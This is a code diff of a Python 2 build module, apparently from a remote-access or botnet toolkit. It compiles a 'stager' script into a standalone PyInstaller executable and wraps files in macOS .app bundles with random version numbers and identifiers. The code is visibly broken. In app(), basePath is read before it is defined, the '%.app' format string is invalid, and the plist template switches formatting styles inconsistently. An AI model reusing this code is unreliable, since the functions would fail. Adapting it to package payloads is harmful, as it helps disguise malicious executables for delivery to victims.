@@ -85,7 +85,7 @@ exe = EXE(pyz,
           strip=False,
           upx=False,
           runtime_tmpdir=None,
-          console=False, icon={icon})
+          console=True, icon={icon})
 """
 
 
@@ -177,7 +177,7 @@ def snippet(template='main', function='main', *args, **kwargs):
     else:
         raise ValueError("invalid argument 'template' (valid: main)")
 
-def exe(filename, icon=None):
+def exe(filename, icon=None, hidden_imports=None):
     """ 
     Compile the Python stager file into a standalone executable
     with a built-in Python interpreter
@@ -190,27 +190,31 @@ def exe(filename, icon=None):
     
     """
     basename = os.path.basename(filename)
-    name     = os.path.splitext(basename)[0]
-    path     = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
-    key      = str().join([random.choice([chr(i) for i in range(48,91) + range(97,123)]) for _ in range(16)])
-    imports  = [i.strip().split()[1].split(';')[0].split(',') for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import']
+    name = os.path.splitext(basename)[0]
+    path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
+    key = str().join([random.choice([chr(i) for i in range(48,91) + range(97,123)]) for _ in range(16)])
+    imports = [i.strip().split()[1].split(';')[0].split(',') for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import']
     for _ in imports:
         if isinstance(_, list):
             __ = imports.pop(imports.index(_))
             for ___ in __:
-                imports.append(___)
-    imports  = list(set(imports))
-    spec     = __Template_spec.format(key=repr(key), basename=repr(basename), path=repr(path), imports=imports, name=repr(name), icon=repr(icon))
-    fspec    = os.path.join(path, name + '.spec')
+                if ___ not in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                    imports.append(___)
+    imports = list(set(imports))
+    if isinstance(hidden_imports, list):
+        imports.extend(hidden_imports)
+    spec = __Template_spec.format(key=repr(key), basename=repr(basename), path=repr(path), imports=imports, name=repr(name), icon=repr(icon))
+    fspec = os.path.join(path, name + '.spec')
     with file(fspec, 'w') as fp:
         fp.write(spec)
-    process  = subprocess.Popen('{} -m PyInstaller {}'.format(sys.executable, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
-    process.wait()
-    if not process.returncode == 0:
-        raise Exception("failed to compile executable: {}".format(str().join((process.communicate()))))
-    output   = os.path.join((path, 'dist', name + str('.exe' if os.name == 'nt' else '')))
-    move     = os.popen('{} dist/{} {}'.format('move' if os.name == 'nt' else 'mv', os.path.basename(output), os.path.basename(output))).read()
-    delete   = map(util.delete, (filename, fspec, os.path.join(path, 'build'), os.path.join(path, 'dist')))
+    process = subprocess.Popen('{} -m PyInstaller {}'.format(sys.executable, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    while True:
+        try:
+            line = process.stdout.readline().rstrip()
+        except: break
+        if line: util.display(line, color='reset', style='dim')
+        if 'EXE' in line and 'complete' in line: break
+    output = os.path.join(path, 'dist', name + str('.exe' if os.name == 'nt' else ''))
     return output
 
 def app(filename, icon=None):
@@ -223,28 +227,25 @@ def app(filename, icon=None):
 
     Returns output filename as a string
     """
-    try:
-        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
-        baseName        = os.path.basename(filename)
-        bundleName      = os.path.splitext(baseName)[0]
-        pkgPath         = os.path.join(basePath, 'PkgInfo')
-        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
-        basePath        = os.path.join(appPath, 'Contents')
-        distPath        = os.path.join(basePath, 'MacOS')
-        rsrcPath        = os.path.join(basePath, 'Resources')
-        plistPath       = os.path.join(rsrcPath, 'Info.plist')
-        iconPath        = os.path.basename(icon)
-        executable      = os.path.join(distPath, filename)
-        bundleVersion   = '%s %s'  % (bundleName, version)
-        bundleIdentity  = 'com.%s' % bundleName
-        infoPlist       = __Template_plist % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
-        os.makedirs(distPath)
-        os.mkdir(rsrcPath)
-        with file(pkgPath, "w") as fp:
-            fp.write("APPL????")
-        with file(plistPath, "w") as fw:
-            fw.write(infoPlist)
-        os.rename(filename, os.path.join(distPath, baseName))
-        return appPath
-    except Exception as e:
-        util.__logger__.error('Method {} returned error: {}'.format(app.func_name, str(e)))
+    version = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
+    baseName = os.path.basename(filename)
+    bundleName = os.path.splitext(baseName)[0]
+    pkgPath = os.path.join(basePath, 'PkgInfo')
+    appPath = os.path.join(os.getcwd(), '%.app' % bundleName)
+    basePath = os.path.join(appPath, 'Contents')
+    distPath = os.path.join(basePath, 'MacOS')
+    rsrcPath = os.path.join(basePath, 'Resources')
+    plistPath = os.path.join(rsrcPath, 'Info.plist')
+    iconPath = os.path.basename(icon)
+    executable = os.path.join(distPath, filename)
+    bundleVersion = bundleName + ' ' + version
+    bundleIdentity = 'com.' + bundleName
+    infoPlist = __Template_plist.format(baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
+    os.makedirs(distPath)
+    os.mkdir(rsrcPath)
+    with file(pkgPath, "w") as fp:
+        fp.write("APPL????")
+    with file(plistPath, "w") as fw:
+        fw.write(infoPlist)
+    os.rename(filename, os.path.join(distPath, baseName))
+    return appPath
